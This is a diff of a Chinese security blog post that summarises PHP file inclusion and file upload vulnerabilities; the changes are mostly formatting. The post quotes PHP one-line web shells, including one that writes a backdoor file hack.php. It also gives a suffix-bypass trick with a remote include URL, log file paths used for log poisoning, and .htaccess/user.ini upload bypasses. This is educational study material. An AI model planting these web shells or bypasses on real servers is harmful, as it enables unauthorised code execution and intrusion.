@@ -4,11 +4,11 @@ description: "PHP 反序列化漏洞总结，梳理魔术方法、POP 链构造�
 pubDate: "2025-12-07"
 updatedDate: "2025-12-07"
 tags: ["PHP", "反序列化", "Web安全"]
-cover: auto
+cover: "1782888593989..jpeg"
 coverAlt: "文件包含和文件上传漏洞总结 的文章封面"
 draft: false
 ---
-# 文件包含&文件上传漏洞总结
+## 文件包含&文件上传漏洞总结
 
 ## 文件包含(php)
 
@@ -36,11 +36,11 @@ PHP的文件包含函数有以下四个：
 
   跟require相似，但是如果包含已经包含过的文件，那就什么也不做
 
-PHP文件有一个特点，被<?php ?>包裹的部分会被解析成PHP代码，没有被包裹的部分会被全部**原样输出**，所以如果你包含到其他文件就能直接看到该文件的内容
+PHP文件有一个特点，被 `<?php ?>` 包裹的部分会被解析成PHP代码，没有被包裹的部分会被全部**原样输出**，所以如果你包含到其他文件就能直接看到该文件的内容
 
 如果有如下的一个漏洞代码
 
-```
+```php
 <?php 
     include '1.txt';
 ?>
@@ -48,7 +48,7 @@ PHP文件有一个特点，被<?php ?>包裹的部分会被解析成PHP代码，
 
 而1.txt的内容如下
 
-```
+```text
 123456
 <?php echo 'hello'; ?>
   include 'world'
@@ -56,7 +56,7 @@ PHP文件有一个特点，被<?php ?>包裹的部分会被解析成PHP代码，
 
 执行结果将为
 
-```
+```text
 123456 hello include 'world'
 ```
 
@@ -78,7 +78,7 @@ PHP文件有一个特点，被<?php ?>包裹的部分会被解析成PHP代码，
 
 如果在半酣过程中出现了指定后缀，指定目录之类的过滤，指定目录可以通过../路径遍历绕过，如过强制添加后缀，可以使用以下方法
 
-```
+```text
 问号绕过
 
 比如file传http://yourhost/1.php?1，就会把后缀识别为GET参数
@@ -100,7 +100,7 @@ Session包含，日志文件包含，以及远程文件包含，session包含利
 
 日志文件包含一般通过包含，我们可以先看一下日志文件中有什么内容时我们可以操控的，然后去进行利用
 
-```
+```text
 nginx：
 /var/log/nginx/error.log
 apache：
@@ -115,7 +115,7 @@ apache：
 
 ### 一句话木马
 
-```
+```php
 <?php @eval($_POST[1]); ?>
 <?php fputs(fopen('hack.php','w'),'<?php @eval($_POST[1])?>'); ?>
 ```
@@ -130,7 +130,7 @@ apache：
 
 一般常见的绕过有更改mime的格式，在图片马中加入正确的mime形式，将后缀改成可以被当成php的文件，但没有被过滤，apache上传.htaccess文件，nginx的usr.ini
 
-```
+```text
 .htaccess
 
 <Files .htaccess>
@@ -142,7 +142,7 @@ apache：
 自解析或者也可以将匹配的文件换成其他文件上传两次
 ```
 
-```
+```text
 GIF89a;
 auto_preprnd_file=a.jpg
 将a.jpg中的内容加到目录下的php文件的最前面，需要要求存在php文件
